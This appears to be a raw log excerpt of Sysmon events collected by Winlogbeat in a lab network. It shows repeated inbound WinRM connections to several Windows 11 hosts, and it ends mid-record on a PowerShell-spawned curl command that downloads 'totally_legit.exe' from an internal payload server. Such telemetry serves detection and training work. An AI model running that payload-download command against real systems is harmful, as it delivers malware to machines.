{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:33:52.040\nProcessGuid: {1c3b4e1a-c763-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 40954\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.65\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.65"]}, "host": {"id": "1c3b4e1a-5518-4a6d-af82-298224d18338", "os": {"family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "build": "22631.2861"}, "ip": ["fe80::1f13:bebd:ede0:ed8c", "10.136.5.65"], "architecture": "x86_64", "mac": ["bc:24:11:65:5d:85"], "hostname": "DESKTOP-JQK13SC"}, "source": {"port": 40954, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:33:52.040Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"type": "ipv4", "community_id": "1:mubDtn+QFL00rxO4KHF43W6kVrk=", "direction": "ingress", "protocol": "-", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{1c3b4e1a-c763-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "0eb94074-2147-427a-8c46-6c6578d3ab93", "id": "1a4af485-022d-4981-8d7f-bea9aff53b0f", "name": "DESKTOP-JQK13SC", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-JQK13SC"}, "event": {"created": "2025-11-08T14:33:54.183Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.65", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 5100, "thread": {"id": 3460}}, "opcode": "Info", "task": "Network connection detected (rule: NetworkConnect)", "computer_name": "DESKTOP-JQK13SC", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 36238}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:33:52.058\nProcessGuid: {4d96f8ad-c7a1-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 42942\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.69\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.69"]}, "host": {"hostname": "DESKTOP-4KG93DG", "os": {"platform": "windows", "family": "windows", "version": "10.0", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "build": "22631.2861"}, "ip": ["fe80::54fd:e63:93ce:bb23", "10.136.5.69"], "architecture": "x86_64", "mac": ["bc:24:11:10:2c:d3"], "id": "4d96f8ad-6ed7-495d-9069-5f56c2ebf694"}, "source": {"port": 42942, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:33:52.058Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"community_id": "1:Da/EtqC1ew/n9Qen+jjvtYF1g68=", "protocol": "-", "direction": "ingress", "type": "ipv4", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{4d96f8ad-c7a1-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "b4008bfb-8e39-4e8e-8ad7-e585c890b879", "id": "bd065c39-423b-48a6-b74e-4c0ace0cf1cc", "name": "DESKTOP-4KG93DG", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-4KG93DG"}, "event": {"created": "2025-11-08T14:33:54.616Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.69", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "Info", "task": "Network connection detected (rule: NetworkConnect)", "computer_name": "DESKTOP-4KG93DG", "process": {"pid": 2248, "thread": {"id": 496}}, "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37394}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:33:52.044\nProcessGuid: {6c054e7e-c777-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 48548\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.67\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.67"]}, "host": {"id": "6c054e7e-a5b1-4db9-8d63-3f70f302d6af", "os": {"name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "family": "windows", "build": "22631.2861"}, "ip": ["fe80::b392:ba9e:24f8:260e", "10.136.5.67"], "architecture": "x86_64", "mac": ["bc:24:11:9a:96:84"], "hostname": "DESKTOP-Q167QR1"}, "source": {"port": 48548, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:33:52.044Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:QUKP+guQLMfn+6w/aufEtRwV1Js=", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{6c054e7e-c777-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "e918f62f-a141-4b32-a344-477f03b1b9ea", "id": "b6d0da7e-2d5b-408f-88d3-d607a27fb60e", "name": "DESKTOP-Q167QR1", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-Q167QR1"}, "event": {"created": "2025-11-08T14:33:54.787Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.67", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"thread": {"id": 1008}, "pid": 3804}, "opcode": "Info", "computer_name": "DESKTOP-Q167QR1", "task": "Network connection detected (rule: NetworkConnect)", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 35803}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:33:52.051\nProcessGuid: {9541e27f-c7a0-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 55948\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.68\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.68"]}, "host": {"hostname": "DESKTOP-5D71Q14", "os": {"family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "build": "22631.2861"}, "ip": ["fe80::bfbe:eb73:3f35:ed8b", "10.136.5.68"], "architecture": "x86_64", "mac": ["bc:24:11:f2:aa:20"], "id": "9541e27f-63d3-48ba-a52f-de9a0436a02f"}, "source": {"port": 55948, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:33:52.051Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:X9uVsh1/Ze7cddT9B897FBQjNag=", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{9541e27f-c7a0-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "d07b82f0-1acc-4d97-9489-166a47073a22", "id": "43e4a97d-cdf0-42b2-8f35-6f5b1e9e1766", "name": "DESKTOP-5D71Q14", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-5D71Q14"}, "event": {"created": "2025-11-08T14:33:54.797Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.68", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"thread": {"id": 5020}, "pid": 560}, "opcode": "Info", "computer_name": "DESKTOP-5D71Q14", "task": "Network connection detected (rule: NetworkConnect)", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37313}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:33:52.050\nProcessGuid: {b14ecd17-c771-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 35922\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.66\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.66"]}, "host": {"id": "b14ecd17-5d3b-4f55-baee-6ff4cabb34b4", "os": {"family": "windows", "name": "Windows 11 Pro", "version": "10.0", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "build": "22631.2861"}, "ip": ["fe80::48f7:5d50:95ed:189a", "10.136.5.66"], "architecture": "x86_64", "mac": ["bc:24:11:45:94:8e"], "hostname": "DESKTOP-8Q44FSM"}, "source": {"port": 35922, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:33:52.050Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:lo9MYMeiEhXe9smQBG9kVekSmcM=", "transport": "tcp"}, "process": {"name": "<unknown process>", "pid": 4, "entity_id": "{b14ecd17-c771-690f-eb03-000000000000}", "executable": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"id": "ad03eb5d-aaf5-44d5-b5c0-e19e6c891455", "hostname": "DESKTOP-8Q44FSM", "name": "DESKTOP-8Q44FSM", "type": "winlogbeat", "version": "7.17.29", "ephemeral_id": "dcd8318d-95d4-4b47-92c0-9b7bdc2aa8b4"}, "event": {"module": "sysmon", "created": "2025-11-08T14:33:55.748Z", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.66", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"thread": {"id": 1884}, "pid": 1156}, "task": "Network connection detected (rule: NetworkConnect)", "computer_name": "DESKTOP-8Q44FSM", "opcode": "Info", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 36570}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:12.538\nProcessGuid: {4d96f8ad-c7a1-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 40138\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.69\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.69"]}, "host": {"id": "4d96f8ad-6ed7-495d-9069-5f56c2ebf694", "os": {"platform": "windows", "type": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "build": "22631.2861"}, "ip": ["fe80::54fd:e63:93ce:bb23", "10.136.5.69"], "architecture": "x86_64", "mac": ["bc:24:11:10:2c:d3"], "hostname": "DESKTOP-4KG93DG"}, "source": {"port": 40138, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:34:12.538Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"type": "ipv4", "community_id": "1:jyk9rLA/5xxnwXa84LBhUv2yjh0=", "direction": "ingress", "protocol": "-", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{4d96f8ad-c7a1-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "b4008bfb-8e39-4e8e-8ad7-e585c890b879", "id": "bd065c39-423b-48a6-b74e-4c0ace0cf1cc", "name": "DESKTOP-4KG93DG", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-4KG93DG"}, "event": {"created": "2025-11-08T14:34:14.991Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.69", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "task": "Network connection detected (rule: NetworkConnect)", "process": {"thread": {"id": 496}, "pid": 2248}, "channel": "Microsoft-Windows-Sysmon/Operational", "computer_name": "DESKTOP-4KG93DG", "opcode": "Info", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37851}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:12.530\nProcessGuid: {9541e27f-c7a0-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 60176\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.68\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.68"]}, "host": {"hostname": "DESKTOP-5D71Q14", "os": {"family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "build": "22631.2861"}, "ip": ["fe80::bfbe:eb73:3f35:ed8b", "10.136.5.68"], "architecture": "x86_64", "mac": ["bc:24:11:f2:aa:20"], "id": "9541e27f-63d3-48ba-a52f-de9a0436a02f"}, "source": {"port": 60176, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:34:12.530Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:yebOUOo8yM6T3c4i+Rgi6VREqLg=", "transport": "tcp"}, "process": {"executable": "<unknown process>", "name": "<unknown process>", "entity_id": "{9541e27f-c7a0-690f-eb03-000000000000}", "pid": 4}, "ecs": {"version": "1.12.0"}, "agent": {"hostname": "DESKTOP-5D71Q14", "ephemeral_id": "d07b82f0-1acc-4d97-9489-166a47073a22", "name": "DESKTOP-5D71Q14", "type": "winlogbeat", "version": "7.17.29", "id": "43e4a97d-cdf0-42b2-8f35-6f5b1e9e1766"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:14.888Z", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.68", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "type": "User", "domain": "NT AUTHORITY", "name": "SYSTEM"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 560, "thread": {"id": 5020}}, "task": "Network connection detected (rule: NetworkConnect)", "computer_name": "DESKTOP-5D71Q14", "opcode": "Info", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37762}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:12.529\nProcessGuid: {b14ecd17-c771-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 53114\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.66\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.66"]}, "host": {"hostname": "DESKTOP-8Q44FSM", "os": {"platform": "windows", "type": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "build": "22631.2861"}, "ip": ["fe80::48f7:5d50:95ed:189a", "10.136.5.66"], "architecture": "x86_64", "mac": ["bc:24:11:45:94:8e"], "id": "b14ecd17-5d3b-4f55-baee-6ff4cabb34b4"}, "source": {"port": 53114, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:34:12.529Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:EYSsXddvi/4bGpS14fOHpHoof30=", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "name": "<unknown process>", "entity_id": "{b14ecd17-c771-690f-eb03-000000000000}"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "dcd8318d-95d4-4b47-92c0-9b7bdc2aa8b4", "id": "ad03eb5d-aaf5-44d5-b5c0-e19e6c891455", "name": "DESKTOP-8Q44FSM", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-8Q44FSM"}, "event": {"module": "sysmon", "created": "2025-11-08T14:34:14.990Z", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.66", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 1156, "thread": {"id": 1884}}, "opcode": "Info", "computer_name": "DESKTOP-8Q44FSM", "task": "Network connection detected (rule: NetworkConnect)", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 37044}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:12.523\nProcessGuid: {6c054e7e-c777-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 37286\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.67\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.67"]}, "host": {"hostname": "DESKTOP-Q167QR1", "os": {"platform": "windows", "family": "windows", "version": "10.0", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "build": "22631.2861"}, "ip": ["fe80::b392:ba9e:24f8:260e", "10.136.5.67"], "architecture": "x86_64", "mac": ["bc:24:11:9a:96:84"], "id": "6c054e7e-a5b1-4db9-8d63-3f70f302d6af"}, "source": {"port": 37286, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:34:12.523Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:vdx2BkUItjjL7BLi8y/1O27eYqw=", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{6c054e7e-c777-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"ephemeral_id": "e918f62f-a141-4b32-a344-477f03b1b9ea", "id": "b6d0da7e-2d5b-408f-88d3-d607a27fb60e", "name": "DESKTOP-Q167QR1", "type": "winlogbeat", "version": "7.17.29", "hostname": "DESKTOP-Q167QR1"}, "event": {"created": "2025-11-08T14:34:14.856Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.67", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 3804, "thread": {"id": 1008}}, "opcode": "Info", "computer_name": "DESKTOP-Q167QR1", "task": "Network connection detected (rule: NetworkConnect)", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 36245}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Network connection detected:\nRuleName: -\nUtcTime: 2025-11-08 14:34:12.521\nProcessGuid: {1c3b4e1a-c763-690f-eb03-000000000000}\nProcessId: 4\nImage: <unknown process>\nUser: -\nProtocol: tcp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 10.24.25.52\nSourceHostname: -\nSourcePort: 53498\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 10.136.5.65\nDestinationHostname: -\nDestinationPort: 5985\nDestinationPortName: -", "related": {"ip": ["10.24.25.52", "10.136.5.65"]}, "host": {"id": "1c3b4e1a-5518-4a6d-af82-298224d18338", "os": {"platform": "windows", "type": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "build": "22631.2861"}, "ip": ["fe80::1f13:bebd:ede0:ed8c", "10.136.5.65"], "architecture": "x86_64", "mac": ["bc:24:11:65:5d:85"], "hostname": "DESKTOP-JQK13SC"}, "source": {"port": 53498, "ip": "10.24.25.52", "domain": "-"}, "@timestamp": "2025-11-08T14:34:12.521Z", "log": {"level": "information"}, "user": {"id": "S-1-5-18"}, "network": {"protocol": "-", "type": "ipv4", "direction": "ingress", "community_id": "1:y2jcNl7kHqGyH8ONko9Hax1wZUY=", "transport": "tcp"}, "process": {"pid": 4, "executable": "<unknown process>", "entity_id": "{1c3b4e1a-c763-690f-eb03-000000000000}", "name": "<unknown process>"}, "ecs": {"version": "1.12.0"}, "agent": {"hostname": "DESKTOP-JQK13SC", "ephemeral_id": "0eb94074-2147-427a-8c46-6c6578d3ab93", "name": "DESKTOP-JQK13SC", "type": "winlogbeat", "version": "7.17.29", "id": "1a4af485-022d-4981-8d7f-bea9aff53b0f"}, "event": {"created": "2025-11-08T14:34:16.072Z", "module": "sysmon", "type": ["connection", "start", "protocol"], "kind": "event", "action": "Network connection detected (rule: NetworkConnect)", "provider": "Microsoft-Windows-Sysmon", "category": ["network"], "code": "3"}, "destination": {"port": 5985, "ip": "10.136.5.65", "domain": "-"}, "winlog": {"event_id": "3", "user": {"identifier": "S-1-5-18", "domain": "NT AUTHORITY", "name": "SYSTEM", "type": "User"}, "channel": "Microsoft-Windows-Sysmon/Operational", "process": {"pid": 5100, "thread": {"id": 3460}}, "task": "Network connection detected (rule: NetworkConnect)", "computer_name": "DESKTOP-JQK13SC", "opcode": "Info", "version": 5, "provider_name": "Microsoft-Windows-Sysmon", "event_data": {"SourcePortName": "-", "User": "-"}, "api": "wineventlog", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "record_id": 36746}}
{"tags": ["beats_input_codec_plain_applied", "_jsonparsefailure", "pikksilm_sysmon"], "@version": "1", "message": "Process Create:\nRuleName: -\nUtcTime: 2025-11-08 14:34:27.929\nProcessGuid: {b14ecd17-54f3-690f-2703-000000000500}\nProcessId: 3664\nImage: C:\\Windows\\System32\\curl.exe\nFileVersion: 8.4.0\nDescription: The curl executable\nProduct: The curl executable\nCompany: curl, https://curl.se/\nOriginalFileName: curl.exe\nCommandLine: \"C:\\Windows\\system32\\curl.exe\" -k -L -o C:/Payloads/totally_legit.exe https://10.136.5.33/payload?payloadId=1\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: DESKTOP-8Q44FSM\\vagrant\nLogonGuid: {b14ecd17-54e4-690f-096f-5c0000000000}\nLogonId: 0x5C6F09\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA1=B41E5AD102F2E599CF8C2FC60219FC1259482387,MD5=C84486B75D148BDE935E7F8F4084A741,SHA256=6CF60C768A7377F7C4842C14C3C4D416480A7044A7A5A72B61FF142A796273EC,IMPHASH=BBDB9C75D95F84296D0FCE2E933932E2\nParentProcessGuid: {b14ecd17-54f2-690f-2603-000000000500}\nParentProcessId: 1512\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"curl.exe -k -L -o 'C:/Payloads/totally_legit.exe' 'https://10.136.5.33/payload?payloadId=1'\"\nParentUser: DESKTOP-8Q44FSM\\vagrant", "related": {"user": "vagrant", "hash": ["b41e5ad102f2e599cf8c2fc60219fc1259482387", "c84486b75d148bde935e7f8f4084a741", "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "bbdb9c75d95f84296d0fce2e933932e2"]}, "host": {"id": "b14ecd17-5d3b-4f55-baee-6ff4cabb34b4", "os": {"kernel": "10.0.22621.2861 (WinBuild.160101.0800)", "type": "windows", "platform": "windows", "version": "10.0", "family": "windows", "name": "Windows 11 Pro", "build": "22631.2861"}, "ip": ["fe80::48f7:5d50:95ed:189a", "10.136.5.66"], "architecture": "x86_64", "mac": ["bc:24:11:45:94:8e"], "hostname": "DESKTOP-8Q44FSM"}, "hash": {"sha256": "6cf60c768a7377f7c4842c14c3c4d416480a7044a7a5a72b61ff142a796273ec", "imphash": "bbdb9c75d95f84296d0fce2e933932e2", "md5": "c84486b75d148bde935e7f8f4084a741", "sha1": "b41e5ad102f2e599cf8c2fc60219fc1259482387"}, "@timestamp": "2025-11-08T14:34:27.929Z", "log": {"level": "information"}, "user": {"name": 